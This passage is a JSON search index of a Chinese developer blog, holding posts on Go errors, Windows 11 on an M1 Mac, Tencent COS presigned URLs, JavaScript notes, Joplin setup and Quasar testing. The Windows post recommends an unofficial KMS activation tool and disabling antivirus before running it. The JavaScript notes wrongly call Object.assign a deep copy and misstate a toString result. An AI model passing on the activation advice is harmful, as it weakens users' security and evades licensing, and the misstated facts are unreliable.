简单来说，就是底层包装、中层传递、顶层处理。\nGo 1.13 Errors # Go 1.13 的 errors 标准库中引入了 Is 和 As 方法，只要错误类型中实现了 Unwrap() 方法返回原始错误，就可以用 errors.Is(err, MyError) 来代替 == 判断错误值，并通过 errors.As(err, \u0026amp;myError) 代替类型断言判断错误类型。\n不过，github.com/pkg/errors 也兼容这一特性，因此可以替代标准库使用。\nEliminate Errors # 不停地写 if err != nil 挺烦的，所以我们想尽量少写点。比如在下面这个例子中，我们想要统计文件行数：\nfunc CountLine(r io.Reader) (int, error) { var ( br = bufio.NewReader(r) lines int err error ) for { _, err = br.ReadString(\u0026#39;\\n\u0026#39;) lines++ if err != nil { break } } if err != io.EOF { return 0, err } return lines, nil } 在 for 循环中 ReadString 出错，或是无内容可读返回 io.EOF，都会跳出循环，这就要求我们捕获两次错误。\n但如果我们借助 Scanner 的 Scan() 方法和 Err() 方法，就可以去掉错误捕获的代码：\nfunc CountLines(r io.Reader) (int, error) { sc := bufio.NewScanner(r) lines := 0 for sc.Scan() { lines++ } return lines, sc.Err() } 可以发现，Scanner 在出错时会将错误暂存到 sc.Err() 的返回值中。我们也可以模仿这个思路，把一个 error 和一个容易产生错误的对象一起封装进一个结构体里，然后在方法内部直接捕获错误：\ntype errWriter struct { io.Writer err error } func (e *errWriter) Write(buf []byte) (int, error) { if e.err != nil { return 0, e.err } var n int n, e.err = e.Writer.Write(buf) return n, nil } 这样，在调用 Write 方法时（例如 io.Copy）就不再需要在外部处理错误了。\n","date":"2021-09-08","permalink":"/posts/go-error/","section":"Posts","summary":"\u003cp\u003e底层包装、中层传递、顶层处理。\u003c/p\u003e","title":"迷途知返：Go Error 处理"},{"content":"拖了很久才来尝鲜。\n借助 Parallels Desktop 17，搭载 M1 芯片的 MBP 也可以运行 ARM 版的 Windows 了。很想尝试一下最新的 Win11，但却发现不满足需要 TPM 芯片的要求，因此想办法绕过了这一限制。\n获取系统 ISO # 为了绕过 TPM，需要采用从 Win10 升级的方法。首先在 UUP dump 下载 Win10 arm64 及 Win11 arm64 的脚本（测试时采用的均为最新的 Insider Preview 版本），在一台 Windows 电脑上运行 uup_download_windows.cmd 即可打包好两个 ISO。\n之所以需要 Windows 电脑来运行脚本，是因为需要在 ISO 中包含 Windows 更新。如果无视更新，也可以在 Linux 或 macOS 上运行相应平台的脚本。\n手动制作升级包 # 通过正常流程在 Parallels 中安装好 Win10 虚拟机，随后将两个 ISO 拖入虚拟机中。将 Win10 的 ISO 中的全部文件复制到虚拟机中的一个目录下，随后用 Win11 的 ISO 中的如下三个文件，替换该目录下的同名文件：\nsources/install.wim sources/boot.wim sources/winsetupboot.sys 这样升级包就做完了。可以发现，这样做本质上是为了在安装 Win 11 时，让安装向导认为安装的系统版本是 Win10。\n升级到 Windows 11 # 运行上述目录下的 setup 程序，耐心等待即可。\n后续版本升级 # 由于 Windows 11 ARM 还在预览体验阶段，需要拥有一个注册了 Windows 预览体验计划的账号并在虚拟机里登录。登录后就可以在设置中方便地进行后续更新了。\n激活 # 经过粗略调查，目前唯一比较可靠的非正规方法是使用 HEU KMS 24 这款激活工具，使用前需要关闭 Windows 安全中心的病毒防护相关功能。\n","date":"2021-08-26","permalink":"/posts/m1-win11/","section":"Posts","summary":"\u003cp\u003e拖了很久才来尝鲜。\u003c/p\u003e","title":"持戈试马：在 MacBook Pro M1 上运行 Windows 11"},{"content":"记录了开发中遇到的和腾讯生态相关的一些问题。\n我曾经抱怨 QQ 的花里胡哨，后来出现了微信；我曾经抱怨微信的功能残疾，后来出现了微信小程序；我曾经抱怨小程序的生态封闭，现在发现原来 QQ 和微信的内置浏览器也是一样的。\n腾讯云 COS # 先记录一个无可厚非的小问题，出现在 Go SDK 文档中 “预签名 URL” 部分。实际上，文档中并没有出现错误，只是对于初次接触的开发者来说可能造成误解。\n开发中的一个常见需求就是向 COS 上传文件，然后获取对应的 URL 供前端下载该文件。因此在文档中，我首先看到了 “上传请求示例” 的代码：\nak := \u0026#34;SECRETID\u0026#34; sk := \u0026#34;SECRETKEY\u0026#34; name := \u0026#34;exampleobject\u0026#34; ctx := context.Background() f := strings.NewReader(\u0026#34;test\u0026#34;) // 1. 通过普通方式上传对象 _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // 获取预签名 URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 2. 通过预签名方式上传对象 data := \u0026#34;test upload with presignedURL\u0026#34; f = strings.NewReader(data) req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f) if err != nil { panic(err) } // 用户可自行设置请求头部 req.Header.Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;) _, err = http.DefaultClient.Do(req) if err != nil { panic(err) } 显然，这里的 1、2 两点是两种不同的上传方式，我这里选择使用第一种方式，并通过第 14 行的代码获取了预签名 URL。然而，访问这一 URL 却会返回 “签名不一致” 的错误信息，无法下载文件。\n继续向下看文档，可以看到 “下载请求示例” 的代码：\nak := \u0026#34;SECRETID\u0026#34; sk := \u0026#34;SECRETKEY\u0026#34; name := \u0026#34;exampleobject\u0026#34; ctx := context.Background() // 1. 通过普通方式下载对象 resp, err := client.Object.Get(ctx, name, nil) if err != nil { panic(err) } bs, _ := ioutil.ReadAll(resp.Body) resp.Body.Close() // 获取预签名 URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 2. 通过预签名 URL 下载对象 resp2, err := http.Get(presignedURL.String()) if err != nil { panic(err) } bs2, _ := ioutil.ReadAll(resp2.Body) resp2.Body.Close() if bytes.Compare(bs2, bs) != 0 { panic(errors.New(\u0026#34;content is not consistent\u0026#34;)) } 如果使用第 13 行的代码来获取预签名 URL，则访问该 URL 可以成功下载文件，这也是这段代码叫 “下载请求示例” 的原因。不难发现，两种获取 URL 的方式唯一的区别在于第二个参数，下载采用 GET 方法，上传采用 PUT 方法。因此实际上 “获取预签名 URL” 的这段代码并不属于第一种方法，而是属于第二种方法。\n我们可以修改注释来避免产生误解，如上传请求示例：\nak := \u0026#34;SECRETID\u0026#34; sk := \u0026#34;SECRETKEY\u0026#34; name := \u0026#34;exampleobject\u0026#34; ctx := context.Background() f := strings.NewReader(\u0026#34;test\u0026#34;) // 1. 通过普通方式上传对象 _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // 2. 通过预签名方式上传对象 // 获取预签名 URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 上传对象 data := \u0026#34;test upload with presignedURL\u0026#34; f = strings.NewReader(data) req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f) if err != nil { panic(err) } // 用户可自行设置请求头部 req.Header.Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;) _, err = http.DefaultClient.Do(req) if err != nil { panic(err) } 下载请求示例：\nak := \u0026#34;SECRETID\u0026#34; sk := \u0026#34;SECRETKEY\u0026#34; name := \u0026#34;exampleobject\u0026#34; ctx := context.Background() // 1. 通过普通方式下载对象 resp, err := client.Object.Get(ctx, name, nil) if err != nil { panic(err) } bs, _ := ioutil.ReadAll(resp.Body) resp.Body.Close() // 2. 通过预签名 URL 下载对象 // 获取预签名 URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // 下载对象 resp2, err := http.Get(presignedURL.String()) if err != nil { panic(err) } bs2, _ := ioutil.ReadAll(resp2.Body) resp2.Body.Close() if bytes.Compare(bs2, bs) != 0 { panic(errors.New(\u0026#34;content is not consistent\u0026#34;)) } 最后，对于正常业务中先上传文件、后返回下载 URL 的需求，我们可以拼接两份示例代码：\nak := \u0026#34;SECRETID\u0026#34; sk := \u0026#34;SECRETKEY\u0026#34; name := \u0026#34;exampleobject\u0026#34; ctx := context.Background() f := strings.NewReader(\u0026#34;test\u0026#34;) // 通过普通方式上传对象 _, err := client.Object.Put(ctx, name, f, nil) if err != nil { panic(err) } // 获取预签名 URL presignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil) if err != nil { panic(err) } // return presignedURL.String() 微信内置浏览器 # 以下问题在安卓 / 苹果手机自带的浏览器中均不存在：\n上传文件时，无法识别 accept=\u0026quot;.mp4,.mov\u0026quot; 等扩展名限制，只能使用 accept=\u0026quot;video/*\u0026quot; 等类型限制。 上传多个文件时，无法同时使用多个类型限制（如 accept=\u0026quot;image/*, video/*\u0026quot;）。于是只能将图片和视频上传分开了。 下载文件时，无法调用标准 web api 中的对应接口。我在项目中是根据 这个办法 判断是否在微信浏览器中，随后向后端传递不同的参数，使得后端返回不同类型的结果。 打开外部 URL 时，无法调用标准 web api 中的对应接口。后来这个需求改了，绕过了这个问题。 通过 URL 打开视频时，可以播放，右下角也有下载按钮，但无法下载。因为是后台的功能，主要使用平台是 PC Web 端，所以没解决。 解决上述问题的通用方案，是引导用户点击右上角并选择 “在浏览器中打开”，这个措施平时也见得很多了。\n为什么微信内置浏览器如此特别？其实还是微信小程序一样的套路，强迫开发者使用 自己的 SDK。\n总的来说，有意不遵循通用的 Web API、封闭自己的生态，无论是出于什么目的都让人相当不快。\n","date":"2021-08-21","permalink":"/posts/tencent-eco/","section":"Posts","summary":"\u003cp\u003e记录了开发中遇到的和腾讯生态相关的一些问题。\u003c/p\u003e","title":"闭门造车：腾讯生态的泥沼"},{"content":"","date":"2021-07-29","permalink":"/tags/javascript/","section":"Tags","summary":"","title":"Javascript"},{"content":"温故而知新，复习后才发现很多基础掌握得不牢固。\n数据类型 # typeof 检查输入参数机器码后三位，000 代表 object 类型，而 null 恰好用全 0 表示。 typeof null // object typeof 对于未实现 [[Call]] 方法的引用类型返回 object ，已实现该方法的则返回 function。 typeof Array // function 简单类型和作为 object 的复杂类型： typeof \u0026#39;hello\u0026#39; // string typeof new String(\u0026#39;hello\u0026#39;) // object instanceof 判断实例时向上追踪原型链。 [] instanceof Array [] instanceof Object 比 typeof 更准确的类型判断： Object.prototype.toString.call([]) // Array 逻辑运算符与非布尔类型混用： 5 || 0 // 5 0 || \u0026#39;a\u0026#39; // \u0026#39;a\u0026#39; 5 \u0026amp;\u0026amp; 0 // 0 拆箱时调用 toPrimitive() 方法： 如果是原始类型值则直接返回； 否则调用 .valueOf()，如果返回值是原始类型值则返回； 否则调用 .toString()，返回得到的 string。 [].valueOf() // [] [].toString() // \u0026#39;\u0026#39; {}.valueOf() // {} {}.toString() // [object Object] [] + [] // \u0026#39;\u0026#39; [] + {} // [object Object] 部分浏览器中将 {} 视作空代码块： { } ;+[] // 0 深浅拷贝 # 浅拷贝 # 遍历赋值 for (var i in origin) { clone[i] = origin[i] } Object.create，实际会拷贝到 clone 的 _proto_ 上： clone = Object.create(origin) 深拷贝 # 借助 JSON： clone = JSON.parse(JSON.stringify(origin)) Object.assign，与空对象合并： clone = Object.assign({}, origin) 编码 # escape 不会对字母、数字以及 *@-_+./ 进行编码，对其他所有字符均进行编码，目前已废弃。 encodeURI 将输入参数视作完整的 URI，不会对字母、数字以及 ,/?:@\u0026amp;=+$# 进行编码，对其他所有字符均进行编码。 encodeURIComponent 将输入参数视作 URI 的一部分，不会对字母、数字以及 -_.!~*'() 进行编码，对其他所有字符均进行编码。 函数与作用域 # 函数与变量的声明会被提前到所在作用域最前面。变量赋值不会被提前。 闭包： function foo() { var a = 2 function bar() { console.log(a) } return bar } var baz = foo() baz() // 2 一个经典例子，timer 访问到的 i 是循环结束后的全局作用域中的 i： for (var i = 1; i \u0026lt;= 5; ++i) { setTimeout(function timer() { console.log(i) }, i * 1000) } // 6 6 6 6 6 解决方案：\n用 IIFE 创建作用域 for (var i = 1; i \u0026lt;= 5; ++i) { ;(function (j) { setTimeout(function timer() { console.log(j) }, j * 1000) })(i) } // 1 2 3 4 5 借助 let 的特性 for (let i = 1; i \u0026lt;= 5; ++i) { setTimeout(function timer() { console.log(i) }, i * 1000) } // 1 2 3 4 5 类数组转为 Array： arr = Array.prototype.slice.apply(args) 实际上，调用 apply、call、bind 等方法均会对 this 进行显式绑定。\nthis 的默认绑定：内部函数（或者其他类似的找不到 this 指向的情况）中的 this 指向 window（严格模式下指向 undefined）： var a = { b: 1, getB: function () { function c() { console.log(this.b) // undefined } c() // window.c() console.log(this.b) // 1（隐式绑定） }, } a.getB() 同理，回调函数也常常会丢失 this。\nnew 调用的所谓 “构造函数” 实际上是对新创建的对象进行初始化的一种“构造调用”，步骤如下： 创建新对象； 执行 [[Prototype]] 连接； 绑定 this，即所谓的 new 绑定； 如果调用的函数没有返回对象，则返回该新对象 优先级：new 绑定 \u0026gt; 显式绑定 \u0026gt; 隐式绑定 \u0026gt; 默认绑定 箭头函数自动继承外层作用域的 this，且无法修改。 其他 # sort 默认将元素转为字符串后升序排序。 var arr = [2, 13, 3, 11, 5, 7] arr.sort() // [11,13,2,3,5,7] ","date":"2021-07-29","permalink":"/posts/js-misc/","section":"Posts","summary":"\u003cp\u003e温故而知新，复习后才发现很多基础掌握得不牢固。\u003c/p\u003e","title":"温故知新：Javascript 杂记"},{"content":"折腾笔记软件。\n背景 # 说是要找一款笔记软件，实际上我最主要的需求还是剪藏网页离线浏览、全文搜索、本地和云端同步这些功能，因为自己写的笔记主要靠 Typora + Hexo + ghPages 放在这个博客里。由于不是特别刚需，就没有什么付费的意愿。在 Big Sur 11.4 M1 上经过了一番折腾，发现以下软件都不能很好的契合需求：\n印象笔记：剪藏功能非常好用，效果也是能找到的工具中最佳的，然而有时候排版效果不怎么样；免费版每月 60M 上传限制有点少；最让人不能忍受的则是其 bug 频出的桌面客户端。 有道云笔记：剪藏效果不佳，整体使用体验也一般。 为知笔记 / Baklib 等：没有长期可用的免费版。 OneNote：对我来说笔记自由度有点太高了；同步速度问题比较大。 Notion：同类天花板，不过学习成本有点高，相当多的强大功能对我而言也不太必要；同样面临剪藏效果和同步速度的尴尬问题。 wolai：Notion 本地化的版本，没有同步速度的问题，其他问题依然存在，且 bug 不少。依赖 web-clipper，虽然很多人都说好用，但是这个适配了很多笔记软件的工具的剪藏效果对我来说依然不够好。 Bear：依赖 web-clipper；非会员无法导出 PDF。目前对 Typora 很满意，以后可能会入手会员。 语雀：依赖 web-clipper；和石墨文档很像，感觉更适合团队用来写共享的技术文档，对个人来说有点太重了。 蚂蚁笔记：开源，依赖 web-clipper；界面、功能都相当简陋，bug 较多。 专注笔记：依赖 web-clipper；功能比较少。 Cubox：免费版 200 条剪藏有点不够用。 Obisidian / Roam Research 等：功能很强大但似乎确实用不上。 Flomo / Google Keep / Pocket / Instapaper / Pinbox / 方片等：感觉产品定位不太符合自己的需求。 最后选择了开源的 Joplin，相比同样开源的蚂蚁笔记，使用体验明显要好很多。最重要的是，其剪藏效果我认为是仅次于、甚至部分情况下优于印象笔记剪藏的。\n基础配置 # 官网 下载后，可以进行一些简单配置：\n通用选项：修改语言、日期格式和使用的外部 Markdown 编辑器，这里可以直接用 /Applications/Typora.app。 同步：修改云同步的选项。 外观：修改主题、字体大小和自定义 css。我不怎么用 Dracula 配色，不过这个软件里的 Dracula 还算挺好看的。后文会阐述如何通过配置自定义 css 实现侧边栏目录的功能。 笔记：可以选择不把地理位置信息保存到笔记中。 插件：可以搜索安装插件，当然也能自己开发一个装上去，这是开源软件的最大优势了。 Markdown：可以开关各种 Markdown 的功能，这里可以发现 Joplin 相比部分同类产品在 Markdown 支持上的优势。 笔记历史：修改笔记历史的保留期限，直接影响 Joplin 记录的笔记占用的磁盘空间大小。 加密：这个部分建议参考 官方文档，否则可能在解密时遇到问题。 网页剪辑器：在客户端启用网页剪辑服务，随后在 Chrome 应用商店可以下载安装 Joplin Web Clipper，首次启动该插件需要回到 Joplin 客户端授予权限；如果使用类似 web-clipper 的第三方剪藏工具，则可以复制该页下方的授权令牌。 侧边栏目录 # Joplin 默认没有这个功能，但是支持 Markdown 的目录扩展，所以在笔记任意位置插入 [toc] 即可生成目录。为了让这个目录悬浮到右边，参考 官方论坛上的一个回答 简单写个 css（这里的背景色是根据 Dracula 主题设置的，可自行修改）：\n/* For styling the rendered Markdown */ :root { /*TOCsidebar 的相关变量 , Toc SideBar variables definition */ --tocsidebar-fontsize: 16px; /*TocSideBar 的字体大小，TocSideBar\u0026#39;s fontsize*/ --tocsidebar-bg: #313640; /*TocSideBar 的面板背景色 , TocSideBar\u0026#39;s panel color*/ --tocsiderbar-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.2); /*TocSideBar 的阴影设置 , TocSideBar\u0026#39;s shadow */ --tocsiderbar-radius:10px; /*TocSideBar 的圆角度 , TocSideBar\u0026#39;s radius */ --tocsiderbar-leftline: 1px solid rgba(255, 255, 255, 0.5); /*TocSideBar 左边竖线线颜色和不透明度，0 为全透明，1 为不透明, TocSideBar\u0026#39;s left line for Classification befor link*/ --tocsidebar-linkcolor: #FFFFFF; /*TocSideBar 链接颜色 , link color*/ --tocsidebar-linkcolor-opacity: 0.8; /*TocSideBar 链接颜色的不透明度, link color\u0026#39;s opacity */ --tocsidebar-linkhovercolor: #E71B64; /*TocSideBar 链接悬停时的颜色 #E71B64 - 玫红色, link color when cursor hovering */ --tocsidebar-linkhovercoloropacity: 1; /*TocSideBar 链接悬停时的颜色的不透明度, link color\u0026#39;s opacity when cursor hovering */ } /************************************************************************************************** * TABLE OF CONTENTS * Based on the idea from here: * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/8 * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/34 * -https://discourse.joplinapp.org/t/share-your-css/1730/192 *************************************************************************************************/ nav.table-of-contents \u0026gt; ul { /*面板固定在右上角, fix Toc panel on the right of the window , this panel is used for activing toc sidebar */ position: fixed; top: 0; right: 6px; z-index: 10; font-size: var(--tocsidebar-fontsize); /*目录字体大小，可设置为 16PX 或 small,16px 比较合适， toc sidebar\u0026#39;s fontsize, 16px is better for our eyes*/ height: 85%; padding: 5px; overflow: hidden; min-width: 20px; /* 右侧面板宽度, 也可用 width: 20px; 设置在鼠标到达右侧 20px 范围内时激活 TocSideBar, 20px means the Toc sidebar will be active when cursor within 20px on the right side of the window */ background: none; /* 面板无背景色填充 */ } nav.table-of-contents ul { /*所有目录 li 的父框 ul 设置，即所有目录父框的设置*/ list-style-type: none; margin-bottom: 0; margin-left: 8px; /*分类距离 tocsidebar 边缘，8px*/ margin-top: 0; } nav.table-of-contents \u0026gt; ul:hover { /*TocSideBar 弹出时，背景底框的设置 所以用 \u0026gt; 只选择一级目录 li 的父框 ul ，填充背景色和阴影以显示 TocSideBar*/ background-color: var(--tocsidebar-bg); border-radius: var(--tocsiderbar-radius); box-shadow: var(--tocsiderbar-shadow); overflow: scroll; width: auto; /*根据内容自动调整宽度 , 但会导致字体加粗显示时跳动, Automatically adjust width according to content */ } nav.table-of-contents \u0026gt; ul:hover li { display: list-item; min-width: 120px; /*Toc SideBar 最小宽度，Toc SideBar \u0026#39;s minimum width*/ } nav.table-of-contents li { display: none; line-height: 1.8em; margin-bottom: 0; white-space: nowrap; } nav.table-of-contents \u0026gt; ul \u0026gt; li \u0026gt; ul li { /*设置目录前的分类线，也可以这样 (空格表示所有子孙代 li) 写 nav.table-of-contents ul li ul li */ border-left: var(--tocsiderbar-leftline); !important; } nav.table-of-contents li a { color: var(--tocsidebar-linkcolor); opacity: var(--tocsidebar-linkcolor-opacity); padding: 5px; } nav.table-of-contents a { /*去掉下划线, remove link\u0026#39;s underline */ text-decoration: none !important; } nav.table-of-contents li a:hover { /*悬停时，改变字体样式，change font style when cursor hovering*/ color: var(--tocsidebar-linkhovercolor); /*link color when cursor hovering */ opacity: var(--tocsidebar-linkhovercoloropacity); } 保存到 ~/.config/joplin-desktop/userstyle.css 并重启客户端即可。\n修改 Markdown 展示字体大小 # 在配置里可以直接修改 Markdown 编辑时的字体大小，而展示时的字体大小则需要修改之前提到的 userstyle.css：\nbody, th, td, .inline-code { font-size: 18px; } 配合简悦使用 # 简悦 也提供了 Chrome 插件，主要是提供纯净阅读视图的。虽然的确是很优秀的软件，也能做到开箱即用，但是过多的配置项总会让人感到有些无所适从（即使是在简洁模式下）。\n在剪藏微信公众号文章时无意中发现，Joplin 的剪藏工具对其中图片的处理有些问题（老封闭平台了），而经过简悦处理后再用 Joplin 剪藏则效果完美，因此将 mp.weixin.qq.com 加入到了简悦白名单里，反正本来读公众号文章也要开阅读模式的。\n此外，简悦也支持绑定 Joplin 并在阅读模式下直接 “保存到 Joplin”，然而我并不推荐这样做。简悦对不少非中文网站以及小众站点的支持相当有限，阅读模式也经常会出现一些格式错误，和 web-clipper 剪藏效果是类似的。因此，还是使用 Joplin Web Clipper 做剪藏能保证最佳的效果。\n清理无用图片 # 剪藏网页时，剪藏图片是非常重要的，但文章中间或者末尾总会出现我们不怎么需要的图片。由于 Joplin 缓存历史的机制，在笔记中删除了这些图片后不会在本地立即清理掉这些无用的图片。因此找到了一款工具 jnrmor 来辅助实现该功能，不太清楚 Joplin 的官方 CLI 或者 API 能不能实现。\n下载 jnrmor 脚本后，首先安装新的 get-opt：\n$ brew install gnu-getopt 随后将新的 get-opt 添加到环境变量，避免使用自带的 get-opt。在 .zshrc 或 .bashrc 末尾写入：\nexport PATH=\u0026#34;/opt/homebrew/opt/gnu-getopt/bin:$PATH\u0026#34; 接下来编辑配置文件 .jnrmor.conf：\n# Joplin profile directory (where the database is located) JOPLIN_DIR=~/.config/joplin-desktop # TOKEN for Joplin Web Clipper (can be found in\u0026#39;Web clipper options\u0026#39;) CLIPPER_TOKEN=xxxxxxxx # Web Clipper Port (can be found in\u0026#39;Web clipper options\u0026#39;) CLIPPER_PORT=41184 注意将 xxxxxxxx 替换为自己的授权令牌。最后运行 ./jnrmor 即可。\n自建 Joplin Server 进行云同步 # 参考 官方文档 和 这篇文章，既可以用其内置 SQLite 的 docker 来测试，又可以用 docker-compose 同时启动 PostgreSQL 和 Joplin Server。\n.env 文件：\nAPP_BASE_URL=http://ip:port # modify ip and port APP_PORT=22300 随后运行：\n$ docker volume create joplin $ docker run -d --name joplin_server -v joplin:/home/joplin --env-file ~/joplin/.env -p port:22300 joplin/server:2.2.7-beta # modify port 注意使用 latest 镜像可能导致出现 Not allowed: PUT 的问题，需要使用最新的 beta 镜像确保升级到 v2，参考 官方论坛。\n登录 Joplin Server 后修改邮箱和密码，将相同配置填入客户端的同步选项中即可。\nJoplin 缺点 # 英文标签只能使用小写字母（如果这也算缺点的话） 云同步接口不多 剪藏墙外文章速度会有点慢，还没研究过怎么给它配代理 UI 可以更好看 更新：\n到目前为止的笔记软件探索之路：印象笔记-\u0026gt;Joplin-\u0026gt;语雀+Obsidian-\u0026gt;语雀+Notion\n","date":"2021-07-17","permalink":"/posts/joplin/","section":"Posts","summary":"\u003cp\u003e折腾笔记软件。\u003c/p\u003e","title":"信手拈来：Joplin 使用小记"},{"content":"","date":"2021-03-21","permalink":"/tags/quasar/","section":"Tags","summary":"","title":"Quasar"},{"content":"对 Quasar 文档测试部分 和 @quasar/testing 文档 部分内容进行了简单翻译，顺便记录了一些目前使用 Quasar 框架进行测试时存在的问题。\nQuasar v1 项目可以通过 @quasar/testing 模块添加多种单元测试和 e2e 测试套件。实际上做的事情就是装一些 node 模块、生成一些配置文件、最后在 package.json 里加点脚本。理论上还可以结合 CI 使用，不过我还没试。\n截止目前，@quasar/testing 尚未迁移到 Quasar v2。\n@quasar/testing 实际上是 Quasar 框架的一个 App Extension，所以只能结合 Quasar CLI 使用（一般也不会用别的），并且只能通过 quasar ext add 命令来安装。\n软件测试 # 测试本身并不难，最困难的是搭测试的环境。测试的关键在于了解到底要测试什么。\n测试功能（functionality），而不是函数（function）。\n测试驱动开发能够让你写出更好的（以及更少的）测试。尽管这样看起来降低了效率，但长远来看能够极大减少项目中的 bug 和维护成本，就像买了必定赔付的保险一样。但并不是所有东西都值得被测试，或者值得在更高层面被测试。比如有些功能用 e2e 测试就好，不用单元测试。\n安装 # 可以装测试套件管理工具来管理所有安装的测试套件，也可以单独安装某个特定的测试套件。没有太大的区别，前者可能更方便点。\n测试套件管理工具 # $ quasar ext add @quasar/testing 安装时会让你选择要安装的测试套件，并且会提供 quasar test 命令方便跑测试，比如：\n# Execute Jest tests $ quasar test --unit jest # Execute Cypress tests $ quasar test --e2e cypress # Execute Jest, Cypress and Security tests $ quasar test --unit jest --e2e cypress --security 这些命令的更底层的命令实际上写在了 quasar.testing.json 里，并且添加新套件之后这个配置文件也会更新。文件中的默认命令都可以在 CI 中使用。举个例子，如果装了 Jest 套件和 Cypress 套件，那配置文件就是这样的：\n// quasar.testing.json { \u0026#34;e2e-cypress\u0026#34;: { \u0026#34;runnerCommand\u0026#34;: \u0026#34;yarn test:e2e:ci\u0026#34; }, \u0026#34;unit-jest\u0026#34;: { \u0026#34;runnerCommand\u0026#34;: \u0026#34;yarn test:unit:ci\u0026#34; } } 注意这里调用了 package.json 脚本，后者的底层命令就是套件本身的命令，比如 jest --ci 等。\n另外，开发不同的 mode 时可能需要变更传给 quasar dev 的参数，如果想在测试的时候也这样做，可以用 --dev 选项，比如：\n# Run jest \u0026amp;\u0026amp; dev server in pwa mode $ quasar test --unit jest --dev=\u0026#34;-m pwa\u0026#34; 单独安装 # 以安装 Jest 套件为例：\n$ quasar ext add @quasar/testing-unit-jest 此时没有 quasar test 命令，但还是可以用 package.json 脚本和套件本身的命令。\n移除 # 要移除一个测试套件（例如 Jest），可以运行：\n$ quasar ext remove @quasar/testing-unit-jest 此时会删除相应的 node 模块，然后调用 Quasar 的 App Extension 卸载钩子。\n重置 # 不用移除，直接重新装一次：\n$ quasar ext add @quasar/testing-unit-jest 注意这样会覆盖掉所有相关文件，包括配置文件，记得备份。同时也会升级对应的 node 模块。如果不想升级 node 模块，可以运行：\n$ quasar ext invoke @quasar/testing-unit-jest 更新 # 直接升级 node 模块就可以了：\n$ yarn add -D @quasar/quasar-app-extension-testing-unit-jest 这样不会影响现有的测试和配置文件。\n更新大版本 # 由于大版本更新可能改变配置文件，建议移除后重装一下：\n$ quasar ext remove @quasar/testing-unit-jest $ quasar ext add @quasar/testing-unit-jest 安装时选 Overwrite all，最后 git diff 一下看看改了哪些地方以及需要还原哪些地方。\n问题 # @quasar/testing 是基于 Jest 26 和 @vue/test-utils 的，所以暂时不支持 Vue 3。编写测试时，首先需要用 mountQuasar 或者 mountFactory 提供一个 Quasar 框架的环境并挂载组件，然后在 options 参数中，指定组件需要用到的 Quasar 组件。比如测一个最简单的 404 页面：\nimport { mountFactory } from \u0026#34;@quasar/quasar-app-extension-testing-unit-jest\u0026#34;; import { QBtn } from \u0026#34;quasar\u0026#34;; import Error404 from \u0026#34;pages/Error404.vue\u0026#34;; const factory = mountFactory(Error404, { quasar: { components: { QBtn }, }, }); describe(\u0026#34;Error404\u0026#34;, () =\u0026gt; { test(\u0026#34;shows correct info\u0026#34;, () =\u0026gt; { const wrapper = factory(); const info = wrapper.get(\u0026#39;[dt=\u0026#34;info\u0026#34;]\u0026#39;); expect(info.text()).toContain(\u0026#34; 页面找不到了\u0026#34;); }); }); 需要注意的是，在测试使用 QPage 组件时，需要提供原本由上层 QLayout 提供的一些参数。这里可以用 qLayoutInjections 来实现：\nimport { mountFactory, qLayoutInjections, } from \u0026#34;@quasar/quasar-app-extension-testing-unit-jest\u0026#34;; import Login from \u0026#34;pages/Login.vue\u0026#34;; const factory = mountFactory(Login, { mount: { provide: qLayoutInjections(), // ... }, // ... }); 随后，对于一些 Vue 插件比如 VueRouter、Vuex 还有 VueCompositionApi 等等，可以通过 plugins 引入。前两者还需要在 mount 中指定给当前的 localVue（这种方式不需要 createLocalVue）。\nimport { mountFactory, qLayoutInjections, } from \u0026#34;@quasar/quasar-app-extension-testing-unit-jest\u0026#34;; import VueCompositionApi from \u0026#34;@vue/composition-api\u0026#34;; import VueRouter from \u0026#34;vue-router\u0026#34;; import Vuex from \u0026#34;vuex\u0026#34;; import Router from \u0026#34;src/router\u0026#34;; import Store from \u0026#34;src/store\u0026#34;; import Login from \u0026#34;pages/Login.vue\u0026#34;; const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), // ... }, // ... }); 最后则是处理 @quasar/testing 的 一个 bug，将涉及到 Quasar Portal 的组件 mock 掉，否则会因为无法访问 Vue 实例上的 $q 而报 warning。\nimport { mountFactory, qLayoutInjections, } from \u0026#34;@quasar/quasar-app-extension-testing-unit-jest\u0026#34;; import VueCompositionApi from \u0026#34;@vue/composition-api\u0026#34;; import VueRouter from \u0026#34;vue-router\u0026#34;; import Vuex from \u0026#34;vuex\u0026#34;; import Router from \u0026#34;src/router\u0026#34;; import Store from \u0026#34;src/store\u0026#34;; import { // ..., Notify, } from \u0026#34;quasar\u0026#34;; import Login from \u0026#34;pages/Login.vue\u0026#34;; Notify.create = jest.fn(); const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), mocks: { Notify }, }, quasar: { components: { // ... }, }, }); describe(\u0026#34;Login\u0026#34;, () =\u0026gt; { // ... }); ","date":"2021-03-21","permalink":"/posts/quasar-test/","section":"Posts","summary":"\u003cp\u003e对 \u003ca href=\"https://next.quasar.dev/quasar-cli/testing-and-auditing#introduction\"   target=\"_blank\"\u003eQuasar 文档测试部分\u003c/a\u003e 和 \u003ca href=\"https://testing.quasar.dev/\"   target=\"_blank\"\u003e@quasar/testing 文档\u003c/a\u003e 部分内容进行了简单翻译，顺便记录了一些目前使用 Quasar 